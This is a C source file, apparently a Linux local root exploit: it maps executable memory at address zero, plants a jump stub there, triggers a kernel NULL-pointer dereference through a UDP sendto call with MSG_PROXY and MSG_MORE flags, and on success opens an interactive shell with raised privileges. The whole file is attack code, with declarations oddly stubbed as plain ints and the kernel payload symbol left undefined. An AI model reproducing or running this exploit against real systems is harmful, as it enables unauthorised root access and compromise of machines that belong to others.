
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int x0x ;
struct sockaddr {char* sa_data; int sa_family; } ;
typedef int buf ;


 int AF_UNSPEC ;
 int MAP_ANONYMOUS ;
 void* MAP_FAILED ;
 int MAP_FIXED ;
 int MAP_PRIVATE ;
 int MSG_MORE ;
 int MSG_PROXY ;
 scalar_t__ PER_SVR4 ;
 int PF_INET ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int SOCK_DGRAM ;
 int close (int) ;
 int execl (char*,char*,char*,int *) ;
 int fprintf (int ,char*) ;
 int getgid () ;
 scalar_t__ getuid () ;
 int gid ;
 int kernel ;
 int memset (char*,int,int) ;
 void* mmap (int,int,int,int,int ,int ) ;
 int mprotect (int,int,int) ;
 int perror (char*) ;
 scalar_t__ personality (int) ;
 int printf (char*) ;
 int sendto (int,char*,int,int,struct sockaddr*,int) ;
 int socket (int ,int ,int ) ;
 int stderr ;
 scalar_t__ uid ;

int main(int argc, char **argv)
{
 int fd=0;
 char buf[1024];
 struct sockaddr x0x;
 void *zero_page;

 uid=getuid();
 gid=getgid();
 if(uid==0){
  fprintf(stderr,"[-] check ur uid\n");
  return -1;
 }
 if(personality(0xffffffff)==PER_SVR4){
  if(mprotect(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC)==-1){
   perror("[-] mprotect()");
   return -1;
  }
 }
 else if((zero_page=mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0))==MAP_FAILED){
   perror("[-] mmap()");
   return -1;
 }
 *(unsigned long *)0x0=0x90909090;
 *(char *)0x00000004=0x90;
 *(char *)0x00000005=0xff;
 *(char *)0x00000006=0x25;
 *(unsigned long *)0x00000007=(unsigned long)&kernel;
 *(char *)0x0000000b=0xc3;

 if((fd=socket(PF_INET,SOCK_DGRAM,0))==-1){
  perror("[-] socket()");
  return -1;
 }
 x0x.sa_family=AF_UNSPEC;
 memset(x0x.sa_data,0x82,14);
 memset((char *)buf,0,sizeof(buf));
 sendto(fd,buf,1024,MSG_PROXY|MSG_MORE,&x0x,sizeof(x0x));
 sendto(fd,buf,1024,0,&x0x,sizeof(x0x));
 if(getuid()==uid){
  printf("[-] exploit failed, try again\n");
  return -1;
 }
 close(fd);
 execl("/bin/sh","sh","-i",((void*)0));
 return 0;
}
